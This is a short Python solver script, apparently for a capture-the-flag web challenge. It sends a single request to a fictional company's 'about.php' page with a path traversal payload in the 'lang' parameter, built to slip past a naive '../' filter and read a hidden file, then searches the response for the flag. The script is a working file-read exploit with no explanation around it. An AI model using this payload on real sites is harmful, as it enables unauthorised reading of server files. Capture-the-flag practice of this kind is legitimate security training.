import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://sekrit-dokuments.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        response = self.session.get(f"{BASE_URL}/pages/about.php?lang=...//...//hidden_files/secret")
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()
